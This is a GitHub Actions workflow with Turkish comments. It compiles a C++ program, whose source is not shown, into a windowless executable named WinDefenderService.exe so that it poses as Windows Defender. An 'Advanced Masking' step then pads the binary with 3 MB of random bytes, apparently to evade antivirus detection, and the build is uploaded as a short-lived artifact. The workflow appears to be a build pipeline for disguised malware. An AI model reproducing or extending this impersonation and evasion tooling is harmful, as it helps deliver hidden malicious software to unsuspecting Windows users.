name: Luna Pro V11 Build

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout Repository
      uses: actions/checkout@v4

    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1

    # Eksik olan httplib.h dosyasını otomatik indirir
    - name: Download Dependency
      shell: powershell
      run: |
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yhirose/cpp-httplib/master/httplib.h" -OutFile "httplib.h"

    - name: Compile
      run: |
        cl.exe /EHsc /O2 /MT main.cpp /Fe:WinDefenderService.exe /link user32.lib ws2_32.lib advapi32.lib ntdll.lib /subsystem:windows

    - name: Advanced Masking (3MB)
      shell: powershell
      run: |
        $exe = "WinDefenderService.exe"
        if (Test-Path $exe) {
            # 3 MB = 3 * 1024 * 1024 = 3,145,728 bytes
            $junkSize = 3145728
            $junk = New-Object byte[] $junkSize
            (New-Object Random).NextBytes($junk)
            
            $stream = [System.IO.File]::OpenWrite((Get-Item $exe).FullName)
            try {
                $stream.Seek(0, [System.IO.SeekOrigin]::End)
                $stream.Write($junk, 0, $junk.Length)
            } finally {
                $stream.Close()
            }
            Write-Host "Basarili: 3MB rastgele veri eklendi."
        }

    - name: Upload Artifact
      uses: actions/upload-artifact@v4
      with:
        name: LunaPro_V11_3MB
        path: WinDefenderService.exe
        retention-days: 1
        
